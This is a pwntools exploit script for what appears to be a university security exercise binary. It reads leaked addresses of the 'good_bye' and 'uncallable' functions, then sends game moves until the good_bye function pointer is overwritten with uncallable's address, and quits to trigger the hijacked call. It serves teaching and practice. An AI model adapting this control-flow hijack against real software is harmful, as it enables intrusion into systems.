#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise6/exercise6a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()


def get_function_address(function_name):
    while True:
        stdout = r.recvline().decode()
        if stdout.startswith(function_name):
            return stdout.split()[1]


# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

class Move:
    left = b"a"
    down = b"s"
    up = b"w"
    right = b"d"
    auto = b"A"
    quit = b"q"

initial_goodbye_address = get_function_address("good_bye")
uncallable_address = get_function_address("uncallable")
current_goodbye_address = initial_goodbye_address

i = 0
while current_goodbye_address == initial_goodbye_address:
    r.recvuntil(b"followed by enter:\n")
    r.sendline(Move.auto)
    current_goodbye_address = get_function_address("good_bye")
    i += 1
print("after %d move, goodbye address has changed from %s to %s" % (i, initial_goodbye_address, current_goodbye_address))
# pause()
while current_goodbye_address != uncallable_address:
    r.recvuntil(b"followed by enter:\n")
    if int(uncallable_address, 16) > int(current_goodbye_address, 16):
        # r.sendline(b'A')
        r.sendline(Move.right)
    else:
        r.sendline(Move.left)
    current_goodbye_address = get_function_address("good_bye")
    i += 1

# now goodbye equals uncallable, time to call it
print("goodbye address: %s, uncallable address: %s" % (current_goodbye_address, uncallable_address))
print("now we are ready")
r.sendline(Move.quit)

print(r.recvall(timeout=3))

